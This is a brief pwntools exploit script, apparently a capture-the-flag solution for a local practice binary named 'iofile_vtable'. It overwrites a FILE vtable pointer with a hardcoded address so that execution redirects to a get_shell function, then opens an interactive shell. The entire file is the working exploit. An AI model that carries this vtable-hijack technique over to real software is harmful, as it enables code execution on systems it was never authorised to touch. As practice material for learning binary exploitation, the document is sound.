#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./iofile_vtable')
p = process()
input()
p.sendafter(b'name: ',p64(exe.sym.get_shell -56))
p.sendlineafter(b'> ',b'4')
p.sendlineafter(b'change: ',p64(0x00000000006010d0))
p.sendlineafter(b'> ',b'2')
p.interactive()
